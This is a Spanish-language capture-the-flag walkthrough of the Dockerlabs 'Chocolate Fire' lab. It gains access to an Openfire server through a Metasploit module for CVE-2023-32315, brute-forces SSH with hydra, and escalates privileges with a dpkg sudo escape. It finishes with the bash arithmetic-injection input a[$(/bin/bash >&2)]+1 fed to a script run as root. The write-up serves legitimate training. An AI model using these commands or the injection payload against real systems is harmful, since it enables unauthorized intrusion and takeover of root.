# Máquina Chocolate Fire

Dificultad -> Media

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

**Imprescindible tener instalado Docker**. Docker te permite ejecutar programas de forma aislada y portátil, como si cada programa tuviera su propio mini-ordenador dentro de tu PC.

## Despliegue del laboratorio

```bash
sudo bash auto_deploy.sh chocolatefire.tar
```

<img width="876" height="607" alt="imagen" src="https://github.com/user-attachments/assets/0b82e4ba-f2a6-4309-abdf-b40b1888196f" />


Vamos a empezar escaneando la máquina para ver que nos encontramos:
```bash
nmap -sCV -Pn -p- --open -min-rate 5000 172.17.0.2 -vvv
```

Encontramos bastantes puertos abiertos:

<img width="623" height="288" alt="imagen" src="https://github.com/user-attachments/assets/51e77424-bece-4783-a753-3c7a32290eb4" />

Como hemos ejecutado -sCV nos mostrará las versiones de los servicios y algunos detalles de ellos al ejecutar los scripts básicos. 

Hay 3 servicios de primeras que me llaman la atención para atacar y por los que vamos a empezar que son el 22(SSH), el 7070(HTTP de Openfire) y el 9090(HTTP y posible interfaz de administración de Openfire). El resto de puertos son:


|   Puerto | Servicio       | Información                   |
| -------: | -------------- | ----------------------------- |
|   **22** | SSH            | OpenSSH 8.4p1 Debian          |
| **5222** | XMPP/Jabber    | Openfire                      |
| **5223** | XMPP sobre SSL | Openfire                      |
| **5262** | XMPP/Jabber    | Openfire 3.10+                |
| **5263** | XMPP sobre SSL | Openfire                      |
| **5269** | XMPP           | Wildfire XMPP                 |
| **5270** | XMPP           | Servicio XMPP                 |
| **5275** | XMPP/Jabber    | Openfire 3.10+                |
| **5276** | XMPP sobre SSL | Openfire                      |
| **7070** | HTTP           | Jetty / Openfire HTTP Binding |
| **7777** | SOCKS5         | Sin autenticación             |
| **9090** | HTTP           | Panel/servicio Openfire       |



Entramos la web alojada y encontramos esto:
<img width="1900" height="305" alt="imagen" src="https://github.com/user-attachments/assets/b857fc51-dade-4305-9d10-6665c37910ec" />

Vamos a probar la 9090. Nos encontramos un panel de administración de Openfire. Openfire es un servidor de mensajería instantánea basado en XMPP.

Piensa en él como el servidor que gestiona una especie de chat interno entre usuarios:
```text
Usuario A ──┐
            ├──> Openfire ──> Usuario B
Usuario C ──┘
```

<img width="1666" height="834" alt="imagen" src="https://github.com/user-attachments/assets/6119bbde-2718-470d-9c21-07338feede79" />

Vemos algo interesante abajo de la imagen y es la versión actual del Openfire. Quizás podemos buscar algún exploit que nos permita bypassear este login y tener acceso al panel de Openfire. Si buscamos en google openfire 6.7.4 exploit obtenemos un CVE:

<img width="1169" height="775" alt="imagen" src="https://github.com/user-attachments/assets/bd54c69a-24e8-41b9-92e1-b8e1c978718b" />

CVE-2023-32315. Vamos a buscar esto en searchsploit o metasploit para ver si hay alguno (de todas formas en internet hay algunos que podríamos descargar).
 En searchsploit no encontré uno para dicha versión pero en Metasploit si:
 
<img width="1833" height="384" alt="imagen" src="https://github.com/user-attachments/assets/d0306247-a9a9-4c6b-ae04-9fc936679de4" />

Vemos que justo hay un exploit con la vulnerabilidad de la versión que queremos. Vamos a usarlo:
```bash
use 4
options
set LHOST <NUESTRA IP>
set RHOSTS 172.17.0.2
run
```

Obtenemos lo siguiente:
<img width="1317" height="466" alt="imagen" src="https://github.com/user-attachments/assets/25fcbc31-e55c-4fc8-bc77-89fff7b0ba1b" />


Hemos explotado un RCE. Por aquí ya tenemos 2 cosas: una sesión y unas credenciales para entrar en Openfire. Por supuesto entramos en Openfire y vamos a inspeccionar la sesión y la web.

Realmente ya somos root en la sesión, ya habríamos completado la resolución de la máquina. Sin embargo habría otros caminos distintos de resolución, como por ejemplo entrar con las credenciales por defecto de OpenFire admin:admin, encontrar un usuario aplicar fuerza bruta, entrar en su sesión SSH y escalar privilegios. Pero al realizarlo de esta forma ya tenemos acceso a la máquina como root:

<img width="276" height="113" alt="imagen" src="https://github.com/user-attachments/assets/c939b723-3290-4f6a-ad16-97eab6dde66a" />

Hemos alcanzado el nivel de privilegios máximos en el sistema!

En la web podemos ver los puertos abiertos, los usuarios, podríamos crear alguno etc:

<img width="1902" height="499" alt="imagen" src="https://github.com/user-attachments/assets/c618b3a0-d190-423b-b84a-2f1780385272" />

--- 
La otra forma de resolución como dije sería acceder como admin. A partir de ahí creamos un diccionario con los usuarios que tenemos:

<img width="364" height="219" alt="imagen" src="https://github.com/user-attachments/assets/afa77173-aa44-4677-9cf0-704477a1353d" />

```bash
nano users.txt

5laahb
admin
chocolatitochingon
idpzykhktjot
```
 Y aplicar hydra sobre ssh:
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64
```

Nos encuentra una password:
<img width="955" height="117" alt="imagen" src="https://github.com/user-attachments/assets/f16d8b74-2298-4896-93fc-2d762239f801" />

Entramos a la sesión ssh de chocoatitochingon.
```bash
ssh chocolatitochingon@172.17.0.2
```

Ahora tendríamos que escalar privilegios en esta máquina. Probamos varias cosas y encontramos algo con sudo -l:

<img width="1385" height="175" alt="imagen" src="https://github.com/user-attachments/assets/77977251-e5d5-4550-bb20-317ea0bdf1ce" />


Ese sudo -l es una vía directa de escalada: puedes ejecutar /usr/bin/dpkg como el usuario pinguinacio sin contraseña. Podemos ver en GTFOBins como escalar dpkg.

Si ejecutamos `sudo -u pinguinacio /usr/bin/dpkg -l` y ponemos !/bin/bash somos pinguinacio:
<img width="1554" height="739" alt="imagen" src="https://github.com/user-attachments/assets/f42e5816-4e7d-4a70-bd63-6df65f19f4f6" />



Volvemos a ejecutar sudo -l y encontramos algo similar:

<img width="1464" height="174" alt="imagen" src="https://github.com/user-attachments/assets/6936e9bc-2ffa-40a6-8d32-f2e77fd98942" />

Vemos el contenido del script:

<img width="1074" height="368" alt="imagen" src="https://github.com/user-attachments/assets/3ae35b33-6e96-4336-9f4b-30bfd6db9eb9" />


Es un script sencillo en Bash donde se pide al usuario introducir el número 1 para poder copiar archivos al directorio /opt.

El problema aparece porque el script no valida la entrada del usuario. Dentro del read, el usuario puede introducir una cadena maliciosa como a[$(/bin/bash >&2)]+1. Bash ejecuta /bin/bash inmediatamente durante la expansión, antes de evaluar la comparación y aunque luego falle.

Para ejecutarlo es necesario utilizar sudo -u root /bin/bash /home/pinguinacio/script.sh

En el input se introducirá a[$(/bin/bash >&2)]+1

<img width="697" height="75" alt="imagen" src="https://github.com/user-attachments/assets/6bac7af5-1ba4-4f3e-b7a6-3ff2cb49dc41" />

Somos root.

Máquina completada!





